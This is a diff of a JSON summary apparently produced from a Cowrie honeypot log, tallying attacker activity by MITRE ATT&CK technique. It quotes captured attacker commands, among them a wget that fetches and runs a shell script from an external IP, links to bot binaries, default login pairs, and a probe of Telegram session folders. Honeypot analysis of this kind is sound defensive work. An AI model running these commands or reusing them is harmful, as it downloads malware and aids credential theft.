@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-23 15:00:11",
+  "generated": "2026-08-23 16:04:57",
   "totals": {
-    "commands": 592,
-    "login_failed": 1257,
-    "login_success": 58,
-    "sessions": 1583
+    "commands": 631,
+    "login_failed": 1294,
+    "login_success": 62,
+    "sessions": 1670
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1257,
+      "count": 1294,
       "examples": [
         "root / q1w2e3r4",
         "user / qwe123",
@@ -21,8 +21,8 @@
         "user / 150.136.155.47"
       ],
       "first": "2026-08-23T00:00:13.506843Z",
-      "last": "2026-08-23T14:54:57.420077Z",
-      "unique_ips": 65
+      "last": "2026-08-23T16:01:17.071662Z",
+      "unique_ips": 69
     },
     {
       "id": "T1222.002",
@@ -44,7 +44,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 107,
+      "count": 122,
       "examples": [
         "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
         "http://176.65.139.202:80/telnet.sh",
@@ -53,14 +53,14 @@
         "http://176.65.139.202/daredevil.mips"
       ],
       "first": "2026-08-23T00:09:31.212472Z",
-      "last": "2026-08-23T14:34:19.089891Z",
-      "unique_ips": 15
+      "last": "2026-08-23T15:38:26.471187Z",
+      "unique_ips": 17
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 58,
+      "count": 62,
       "examples": [
         "hikvision / hikvision",
         "bin / bin",
@@ -69,14 +69,14 @@
         "root / 123123"
       ],
       "first": "2026-08-23T00:09:30.963003Z",
-      "last": "2026-08-23T14:51:22.220994Z",
-      "unique_ips": 48
+      "last": "2026-08-23T15:54:41.577320Z",
+      "unique_ips": 52
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 18,
+      "count": 21,
       "examples": [
         "uname -m",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -85,8 +85,8 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-23T00:09:31.058995Z",
-      "last": "2026-08-23T14:43:35.141689Z",
-      "unique_ips": 12
+      "last": "2026-08-23T15:54:43.954880Z",
+      "unique_ips": 14
     },
     {
       "id": "T1033",
@@ -145,21 +145,47 @@
       "unique_ips": 3
     },
     {
-      "id": "T1037",
-      "name": "Boot or Logon Initialization Scripts",
-      "tactic": "Persistence",
-      "count": 1,
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 2,
       "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'"
       ],
-      "first": "2026-08-23T10:38:41.293539Z",
-      "last": "2026-08-23T10:38:41.293539Z",
+      "first": "2026-08-23T15:54:44.612747Z",
+      "last": "2026-08-23T15:54:45.274530Z",
       "unique_ips": 1
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
+      ],
+      "first": "2026-08-23T10:38:41.293539Z",
+      "last": "2026-08-23T15:54:45.945189Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-08-23T15:54:42.644071Z",
+      "last": "2026-08-23T15:54:42.644071Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1037",
+      "name": "Boot or Logon Initialization Scripts",
+      "tactic": "Persistence",
       "count": 1,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
@@ -220,27 +246,27 @@
   "unmapped": [
     [
       "/bin/busybox",
-      278
+      280
     ],
     [
       "shell",
-      16
+      17
     ],
     [
       "sh",
-      16
+      17
     ],
     [
       "system",
-      14
+      16
     ],
     [
       "enable",
-      13
+      15
     ],
     [
       "linuxshell",
-      9
+      11
     ],
     [
       "ping ;sh",
@@ -263,11 +289,11 @@
       3
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      2
+      "ping; sh",
+      3
     ],
     [
-      "ping; sh",
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       2
     ],
     [
